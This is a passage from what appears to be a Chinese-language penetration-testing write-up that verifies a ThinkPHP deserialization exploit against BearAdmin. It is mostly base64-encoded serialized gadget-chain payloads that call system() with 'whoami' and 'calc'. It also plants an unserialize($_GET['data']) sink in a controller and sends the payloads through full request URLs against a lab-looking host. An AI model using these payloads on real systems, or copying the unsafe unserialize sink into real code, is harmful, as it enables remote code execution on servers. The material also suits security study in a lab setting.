TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjk6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjM6Inh4eCI7YToxOntpOjA7czo0OiJjYWxjIjt9fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6Inh4eCI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo4OiIAKgB0YWJsZSI7TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjk6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjM6Inh4eCI7YToxOntpOjA7czo0OiJjYWxjIjt9fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6Inh4eCI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo4OiIAKgB0YWJsZSI7czowOiIiO3M6NzoiACoAanNvbiI7YToxOntpOjA7czozOiJ4eHgiO31zOjEyOiIAKgBqc29uQXNzb2MiO2I6MTt9czo3OiIAKgBqc29uIjthOjE6e2k6MDtzOjM6Inh4eCI7fXM6MTI6IgAqAGpzb25Bc3NvYyI7YjoxO30=
```



### 3.验证exploit

#### 1）index.php类

在`index`下的`controller`下的index.php类里面写入反序列化语句，实现简单的逻辑即可。

> BearAdmin/app/index/controller/IndexController.php

```php
$d = base64_decode($_GET['data']);
unserialize($d);
```

![image-20240911191946606](https://image.201068.xyz/assets/31.PHP/image-20240911191946606-1726054406448-10-1726055646636-2.png)

#### 2）生成序列化数据

执行exp.php

##### whoami

> $this->data = ['xxx' => ['whoami']];

![image-20240911192940930](https://image.201068.xyz/assets/31.PHP/image-20240911192940930-1726055646636-1.png)

```php
TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjk6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjM6Inh4eCI7YToxOntpOjA7czo2OiJ3aG9hbWkiO319czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MzoieHh4IjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX1zOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjg6IgAqAHRhYmxlIjtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6OTp7czoyMToiAHRoaW5rXE1vZGVsAGxhenlTYXZlIjtiOjE7czoxMjoiACoAd2l0aEV2ZW50IjtiOjA7czoxOToiAHRoaW5rXE1vZGVsAGV4aXN0cyI7YjoxO3M6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6MzoieHh4IjthOjE6e2k6MDtzOjY6Indob2FtaSI7fX1zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czozOiJ4eHgiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fXM6MTg6IgB0aGlua1xNb2RlbABmb3JjZSI7YjoxO3M6ODoiACoAdGFibGUiO3M6MDoiIjtzOjc6IgAqAGpzb24iO2E6MTp7aTowO3M6MzoieHh4Ijt9czoxMjoiACoAanNvbkFzc29jIjtiOjE7fXM6NzoiACoAanNvbiI7YToxOntpOjA7czozOiJ4eHgiO31zOjEyOiIAKgBqc29uQXNzb2MiO2I6MTt9
```

##### calc

> $this->data = ['xxx' => ["calc"]];

#### 3）浏览器访问当前项目进行验证

##### 修改普通用户密码

![image-20240911192347795](https://image.201068.xyz/assets/31.PHP/image-20240911192347795-1726055646637-3.png)

##### 登录普通用户

![image-20240911192323649](https://image.201068.xyz/assets/31.PHP/image-20240911192323649-1726055646637-4.png)

> 10001 / 123456

![image-20240911192602796](https://image.201068.xyz/assets/31.PHP/image-20240911192602796-1726055646637-5.png)

##### whoami

```php
http://www.wasjpentest008.com/index.php/index/index?data=TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjk6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjM6Inh4eCI7YToxOntpOjA7czo2OiJ3aG9hbWkiO319czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MzoieHh4IjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX1zOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjg6IgAqAHRhYmxlIjtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6OTp7czoyMToiAHRoaW5rXE1vZGVsAGxhenlTYXZlIjtiOjE7czoxMjoiACoAd2l0aEV2ZW50IjtiOjA7czoxOToiAHRoaW5rXE1vZGVsAGV4aXN0cyI7YjoxO3M6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6MzoieHh4IjthOjE6e2k6MDtzOjY6Indob2FtaSI7fX1zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czozOiJ4eHgiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fXM6MTg6IgB0aGlua1xNb2RlbABmb3JjZSI7YjoxO3M6ODoiACoAdGFibGUiO3M6MDoiIjtzOjc6IgAqAGpzb24iO2E6MTp7aTowO3M6MzoieHh4Ijt9czoxMjoiACoAanNvbkFzc29jIjtiOjE7fXM6NzoiACoAanNvbiI7YToxOntpOjA7czozOiJ4eHgiO31zOjEyOiIAKgBqc29uQXNzb2MiO2I6MTt9
```

![image-20240911193042194](https://image.201068.xyz/assets/31.PHP/image-20240911193042194-1726055646637-6.png)

##### calc

```php
http://www.wasjpentest008.com/index.php/index/index?data=TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjk6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjM6Inh4eCI7YToxOntpOjA7czo0OiJjYWxjIjt9fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6Inh4eCI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo4OiIAKgB0YWJsZSI7TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjk6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjM6Inh4eCI7YToxOntpOjA7czo0OiJjYWxjIjt9fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6Inh4eCI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo4OiIAKgB0YWJsZSI7czowOiIiO3M6NzoiACoAanNvbiI7YToxOntpOjA7czozOiJ4eHgiO31zOjEyOiIAKgBqc29uQXNzb2MiO2I6MTt9czo3OiIAKgBqc29uIjthOjE6e2k6MDtzOjM6Inh4eCI7fXM6MTI6IgAqAGpzb25Bc3NvYyI7YjoxO30=
```

![image-20240911192653180](https://image.201068.xyz/assets/31.PHP/image-20240911192653180-1726054522602-12-1726055646637-7.png)
